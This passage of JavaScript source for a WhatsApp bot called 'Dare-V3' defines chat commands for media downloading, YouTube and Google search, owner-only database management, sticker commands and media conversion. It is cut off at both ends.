*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replydare(`${result4}`)
Dare.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break

case 'fb':
case 'fbdl':
           case 'facebook':
           case 'facebookvid': {
           if (!text)  return replydare(`Please send video link Facebook\n\nExample :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
     Dare.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
  try {
    const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
    const tex = `*[ FACEBOOK DL BY ${botname} ]*`;
    const videoBuffer = data.result.Normal_video;
    Dare.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replydare('Error sɪʀ')
  }
  }
  break
			
case 'tiktokxx':{ 
if (!text) return replydare( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replydare(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Dare.sendMessage(m.chat, { caption: `Here he is!!`, video: { url: data.watermark }}, {quoted:m})
})
}
break
case 'tiktokaudioxx':{
if (!text) return replydare( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replydare(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
Dare.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'google': {
if (!q) return replydare(`Example : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replydare(teks)
})
}
break
case 'happymod':{
if (!q) return replydare(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.wait)
let kat = await scp1.happymod(q)
replydare(util.format(kat))
}
break
case 'yts': case 'ytsearch': {
if (!text) return replydare(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
Dare.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
case 'warcall': {
 //if (!m.isGroup) return reply(mess.only.group)
if(!text) return reply(`Example: \n.warcall kontol`)
Dare.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: 1,
scheduledTimestampMs:  Date.now(),
title: text
}
}, {})
}
break
case 'xxxxplay':{
if (!text) return replydare(`Example : ${prefix+command} story wa anime`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
Dare.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break

case 'search': {
  if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);

  try {
    const yts = require("yt-search");
    const search = await yts(text);
    const video = search.videos[0];

    if (!video) return reply(`*No results found for:* ${text}`);

    const buttons = [
      { buttonId: `.video ${text}`, buttonText: { displayText: 'Video' }, type: 1 },
      { buttonId: `.music ${text}`, buttonText: { displayText: 'Audio' }, type: 1 }
    ];

    const buttonMessage = {
      text: `*SELECT AN OPTION*\n\n` + 
            `> *Title:* ${video.title}\n` + 
            `> *Views:* ${video.views}\n` + 
            `> *Duration:* ${video.timestamp}\n` + 
            `> *Uploaded:* ${video.ago}\n` + 
            `> *Url:* ${video.url}`,
      footer: 'DARE-V4',
      buttons: buttons,
      headerType: 1
    };

    await Dare.sendMessage(m.chat, buttonMessage, { quoted: m });
  } catch (error) {
    console.error('Error during search command:', error);
    reply(`*An error occurred while processing your request. Please try again later.*`);
  }
}
break;

case 'video': {
await loading()
    if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker 🎵`);

    try {
        // React with a camera emoji to indicate video fetching
        await Dare.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });

        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; 
        
        // Construct message body with video details
        let body = `🎬 *DARE-V3 VIDEO PLAYER* 🎬\n` +
                   `> 🎥 *Title:* *${video.title}*\n` +
                   `> 👀 *Views:* *${video.views}*\n` +
                   `> ⏱️ *Duration:* *${video.timestamp}*\n` +
                   `> 🗓️ *Uploaded:* *${video.ago}*\n` +
                   `> 🔗 *URL:* *${video.url}*`;

        // Send the video thumbnail and details
        await Dare.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });

        const apiUrl = `https://api.davidcyriltech.my.id/download/ytmp4`;
        const apiResponse = await axios.get(apiUrl, {
            params: { url: video.url }
        });

        // Check if the video download URL is successful
        if (apiResponse.data.success) {
            const { title, download_url } = apiResponse.data.result;

            // Send the video file directly with a cool caption
            await Dare.sendMessage(m.chat, {
                video: { url: download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}\n\n> 🔥 POWERED BY DARE-V3 💥`
            }, { quoted: m });
        } else {
            reply(`❌ *Error fetching the video!* Please try again later. 😓`);
        }
    } catch (error) {
        console.error('Error during video command:', error);
        reply(`⚠️ *An error occurred while processing your request.* Please try again. 🙏`);
    }
    break;
}
case'music':{
await loading()
 try {
 if (!text) return replydare(`🎵 *Example:* ${prefix + command} anime whatsapp status`);
// Notify the user of processing

 // Perform a search using yts
 const yts = require("yt-search");
 let search = await yts(text);

 if (!search || search.videos.length === 0) {
 return replydare('❌ *No video found.* Please try with a different keyword.');
 }

 // Get the first video from the search results
 let video = search.videos[0];

 // Extract video details
 let { title, thumbnail, videoId } = video;
 const url = 'https://www.youtube.com/watch?v=' + videoId;

 // Use the new API to fetch the audio details
 const apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(url)}`;
 const response = await axios.get(apiUrl);

 if (!response.data || !response.data.status || !response.data.data || !response.data.data.dl) {
 return replydare('🚫 *Error fetching audio from the URL.* Please try again later.');
 }

 // Extract details from the API response
 const { dl } = response.data.data;

 // Prepare the audio message
 const audioDetails = {
 audio: { url: dl },
 mimetype: 'audio/mpeg', // Correct MIME type for MP3 audio
 fileName: `${title}.mp3`, // Set the file name
 ptt: true, // Send as a press-to-talk (PTT) message
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 mediaType: 2,
 mediaUrl: url,
 title: title,
 body: 'hariini', // You can customize this to something like "Today"
 sourceUrl: url,
 thumbnail: await (await fetch(thumbnail)).buffer() // Fetch and send the thumbnail image
 }
 }
 };

 // Send the audio message with context and the thumbnail
 await Dare.sendMessage(m.chat, audioDetails, { quoted: m });

 } catch (error) {
 console.error("Error in play command:", error);
 replydare("⚠️ *An error occurred while processing your request.* Please try again or try song,music, Spotify,spdl.");
 }
}
break
case "play2": {
await loading()
  if (!text) return m.reply("𝙀.𝙂 .𝙋𝙇𝘼𝙔 𝘼𝙒𝙊𝙇𝙊𝙒𝙊");

  async function handleCommandytplay(text) {
    let res;
    try {
      // Search YouTube for the given text
      res = await yts(text);
    } catch (error) {
      throw new Error('Error fetching YouTube search results');
    }

    let vid = res.videos[0];
    if (!vid) throw new Error('Video not found, try reversing the title and author');

    let { title, description, thumbnail, videoId } = vid;
    const url = 'https://www.youtube.com/watch?v=' + videoId;

    // Attempt to download audio using youtubedl or youtubedlv2
    let yt;
    try {
      yt = await youtubedl(url);
    } catch (error) {
      yt = await youtubedlv2(url);
    }

    const link = await yt.audio['128kbps'].download();

    // Prepare message with audio and context information
    let doc = {
      audio: {
        url: link
      },
      mimetype: 'audio/mpeg', // Correct MIME type for MP3 audio
      ptt: true,  // Use press-to-talk format
      contextInfo: {
        externalAdReply: {
          showAdAttribution: true,
          mediaType: 2,
          mediaUrl: url,
          title: title,
          body: 'hariini', // You can change this to something like "Today"
          sourceUrl: url,
          thumbnail: await (await fetch(thumbnail)).buffer() // Fetch and send the thumbnail image
        }
      }
    };

    // Send the audio message
    return Dare.sendMessage(m.chat, doc, { quoted: m });
  }

  try {
    // Call the function to handle the YouTube search and audio download
    await handleCommandytplay(text);
  } catch (error) {
    console.error(error);
    m.reply("⚠️ *An error occurred while processing your request.* Please try again or use song or spotify.");
  }
}
break;
case 'song': {
await loading()
  try {
    if (!text) return replydare(`🎵 *Example:* ${prefix + command} anime whatsapp status`);

     // Notify the user of processing
     // if audio is not playing
   reply(`use tovn or toaudio if audio is not playing`) 
    // Perform a search using yts
    const yts = require("yt-search");
    let search = await yts(text);

    if (!search || search.videos.length === 0) {
      return replydare('❌ *No video found.* Please try with a different keyword.');
    }

    // Get the first video from the search results
    let video = search.videos[0];

    // Use the new API to fetch the audio details
    const apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(video.url)}`;
    const response = await axios.get(apiUrl);

    if (!response.data || !response.data.status || !response.data.data || !response.data.data.dl) {
      return replydare('🚫 *Error fetching audio from the URL.* Please try again later.');
    }

    // Extract details from the API response
    const { title, dl } = response.data.data;

    // Prepare a nicely formatted message
    const audioDetails = `*🎶 Audio Found!*\n\n` +
                         `📌 *Title:* _${title}_\n` +
                         `🔗 *Link:* [Click Here](${video.url})\n\n` +
                         `📥 *Downloading audio...*`;

    // Send audio details
    await replydare(audioDetails);

    // Send audio as a voice note
    await Dare.sendMessage(m.chat, {
      audio: { url: dl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true // Sends as a voice note
    }, { quoted: m });

  } catch (error) {
    console.error("Error in song command:", error);
    replydare("⚠️ *An error occurred while processing your request.* Please try again or use play or spotify.");
  }
}
break;
case 'ytmp3': case 'ytaudio': case 'ytplayaudio': {
  if (!text) return replydare(`📌 *Example:* ${prefix + command} youtube_url`);
  if (!text.includes('youtu')) return replydare('❌ *The URL does not contain results from YouTube!*');
  
  try {
      const hasil = await ytMp3(text); // Use the primary ytMp3 function
      reply(mess.wait)
      
      await Dare.sendMessage(m.chat, {
          audio: { url: hasil.result },
          mimetype: 'audio/mpeg',
          contextInfo: {
              externalAdReply: {
                  title: hasil.title,
                  body: hasil.channel,
                  previewType: 'PHOTO',
                  thumbnailUrl: hasil.thumb,
                  mediaType: 1,
                  renderLargerThumbnail: true,
                  sourceUrl: text
              }
          }
      }, { quoted: m });

      replydare(`🎧 *Now Playing:* ${hasil.title}\n` +
                    `🎬 *Channel:* ${hasil.channel}\n` +
                    `📅 *Uploaded On:* ${hasil.uploadDate}\n` +
                    `💾 *Size:* ${hasil.size}\n\n` +
                    `🔻 *Enjoy the music!* 🔻`);
  } catch (err) {
      console.error('❌ Error downloading audio:', err); // Log any errors
      replydare('⚠️ *Error:* Could not download the audio.');
  }
}
break;
case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
  if (!text) return replydare(`📌 *Example:* ${prefix + command} youtube_url`);
  if (!text.includes('youtu')) return replydare('❌ *The URL does not contain results from YouTube!*');
  
  try {
      const hasil = await ytMp4(text); // Use the primary ytMp4 function
      reply(mess.wait)

      // Extract and format additional data
      const views = hasil.views ? hasil.views.toLocaleString() : "0";
      const likes = hasil.likes ? hasil.likes.toLocaleString() : "0";
      const dislikes = hasil.dislike ? hasil.dislike.toLocaleString() : "0";

      await Dare.sendMessage(m.chat, {
          video: { url: hasil.result },
          caption: `🎥 *Title:* ${hasil.title}\n` +
                   `📜 *Description:* ${hasil.desc || 'No description'}\n` +
                   `📺 *Channel:* ${hasil.channel}\n` +
                   `👁️ *Views:* ${views}\n` +
                   `👍 *Likes:* ${likes}\n` +
                   `👎 *Dislikes:* ${dislikes}\n` +
                   `📆 *Uploaded On:* ${hasil.uploadDate}\n\n` +
                   `💻 *SERVER:* KALI LINUX\n` +
                   `🔻 *DOWNLOADED BY DARE-V3 🔻*\n\n` +
                   `✨ *Enjoy your video!* ✨`
      }, { quoted: m });
  } catch (err) {
      console.error('❌ Error downloading video:', err); // Log any errors
      replydare('⚠️ *Error:* Could not download the video.');
  }
}
break;
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replydare('Enter the link!!!')
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replydare('Enter the link!!!')
reply(mess.wait)
downloadMp3(text)
}
break  
case 'mycase':
if (!DareTheCreator) return reply(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("Dare.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replydare(`${getCase(q)}`)
break
//=========================================\\
	case 'addprem': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!args[0]) return replydare(`Use ${prefix+command} number\nExample ${prefix+command} 23481xxxxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Dare.onWhatsApp(prrkek)
if (ceknya.length == 0) return replydare(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replydare(`The Number ${prrkek} Has Been Premium!`)
}
break
//=========================================\\
case 'delprem':
if (!DareTheCreator) return reply(mess.only.owner)
if (!args[0]) return replydare(`Use ${prefix+command} nomor\nExample ${prefix+command} 23481xxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replydare(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Whats the word?')
if (BadNano.includes(q)) return replydare("The word is already in use")
BadNano.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replydare(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Enter the word')
if (!BadNano.includes(q)) return replydare("The word does not exist in the database")
let wanu = BadNano.indexOf(q)
BadNano.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadNano))
replydare(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadNano.length}*`
replydare(teks)
}
break
case 'addvideo':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Whats the video name?')
if (VideoNano.includes(q)) return replydare("The name is already in use")
let delb = await Dare.downloadAndSaveMediaMessage(quoted)
VideoNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/video/${q}.mp4`)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(delb)
replydare(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Enter the video name')
if (!VideoNano.includes(q)) return replydare("The name does not exist in the database")
let wanu = VideoNano.indexOf(q)
VideoNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvideo.json', JSON.stringify(VideoNano))
fs.unlinkSync(`./data/NanoMedia/video/${q}.mp4`)
replydare(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNano.length}*`
replydare(teks)
}
break
case 'addimage':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Whats the image name?')
if (ImageNano.includes(q)) return replydare("The name is already in use")
let delb = await Dare.downloadAndSaveMediaMessage(quoted)
ImageNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/image/${q}.jpg`)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(delb)
replydare(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Enter the image name')
if (!ImageNano.includes(q)) return replydare("The name does not exist in the database")
let wanu = ImageNano.indexOf(q)
ImageNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(`./data/NanoMedia/image/${q}.jpg`)
replydare(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNano.length}*`
replydare(teks)
}
break
case 'addsticker':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Whats the sticker name?')
if (NanoSticker.includes(q)) return replydare("The name is already in use")
let delb = await Dare.downloadAndSaveMediaMessage(quoted)
NanoSticker.push(q)
await fsx.copy(delb, `./data/NanoMedia/sticker/${q}.webp`)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(delb)
replydare(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Enter the sticker name')
if (!NanoSticker.includes(q)) return replydare("The name does not exist in the database")
let wanu = NanoSticker.indexOf(q)
NanoSticker.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(`./data/NanoMedia/sticker/${q}.webp`)
replydare(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of NanoSticker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoSticker.length}*`
replydare(teks)
}
break
case 'addvn':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Whats the audio name?')
if (NanoVoiceNote.includes(q)) return replydare("The name is already in use")
let delb = await Dare.downloadAndSaveMediaMessage(quoted)
NanoVoiceNote.push(q)
await fsx.copy(delb, `./data/assets/audio/${q}.mp3`)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(delb)
replydare(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!DareTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replydare('Enter the vn name')
if (!NanoVoiceNote.includes(q)) return replydare("The name does not exist in the database")
let wanu = NanoVoiceNote.indexOf(q)
NanoVoiceNote.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(`./data/assets/audio/${q}.mp3`)
replydare(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of NanoVoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoVoiceNote.length}*`
replydare(teks)
}
break
case 'addowner':
if (!DareTheCreator) return reply(mess.only.owner)
if (!args[0]) return replydare(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Dare.onWhatsApp(bnnd)
if (ceknye.length == 0) return replydare(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replydare(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!DareTheCreator) return reply(mess.only.owner)
if (!args[0]) return replydare(`Use ${prefix+command} nomor\nExample ${prefix+command} 23481xxxxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replydare(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let Dare of prem) {
teks += `- ${Dare}\n`
}
teks += `\n*Total : ${prem.length}*`
Dare.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replydare('Reply Message!')
if (!m.quoted.fileSha256) return replydare('SHA256 Hash Missing')
if (!text) return replydare(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replydare('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replydare(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replydare(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replydare('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replydare(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
Dare.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!m.quoted) return replydare('Reply Message!')
if (!m.quoted.fileSha256) return replydare('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replydare('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replydare('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replydare('Reply Message You Want To Save In Database')
if (!text) return replydare(`Example : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replydare(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replydare(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replydare(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replydare(`'${text}' not listed in the message list`)
Dare.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replydare(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replydare(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replydare(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif':
case 'setpackname': {
               if (!DareTheCreator) return reply(mess.only.owner)
               if (!text) return replydare(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replydare(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Dare.fetchStatus(who)
    replydare(bio.status)
  } catch {
    if (text) return replydare(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Dare.fetchStatus(who)
      replydare(bio.status)
    } catch {
      return replydare(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'setppbot': case 'setpp': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!quoted) return replydare(`Send/Reply to Images With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replydare(`Send/Reply to Images With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replydare(`Send/Reply to Images With Caption ${prefix + command}`)
var medis = await Dare.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Dare.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replydare(`Success`)
} else {
var memeg = await Dare.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replydare(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!DareTheCreator) return reply(mess.only.owner)
if (!args.join(" ")) return replydare(`Use ${prefix+command} groupname`)
try {
let cret = await Dare.groupCreate(args.join(" "), [])
let response = await Dare.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
Dare.sendMessage(m.chat, { text:teks, mentions: await Dare.parseMention(teks)}, {quoted:m})
} catch {
replydare("Error!")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Dare.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Dare.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
if (!quoted) return replydare('Reply to Sticker')
if (!/webp/.test(mime)) return replydare(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
let media = await Dare.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Dare.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
             case 'toaud': case 'toaudio': {
				if (!/video/.test(mime) && !/audio/.test(mime)) return replydare(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
				 reply(mess.wait)
				let media = await (m.quoted ? m.quoted.download() : m.download())
				let audio = await toAudio(media, 'mp4')
				await Dare.sendMessage(m.chat, { audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
			}
			break
            
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replydare(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replydare(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Dare.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) return replydare('Reply video')
if (!/webp/.test(mime)) return replydare(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await Dare.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Dare.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replydare(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Dare.sendMessage(from, { image: medi, caption:"Here he is!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
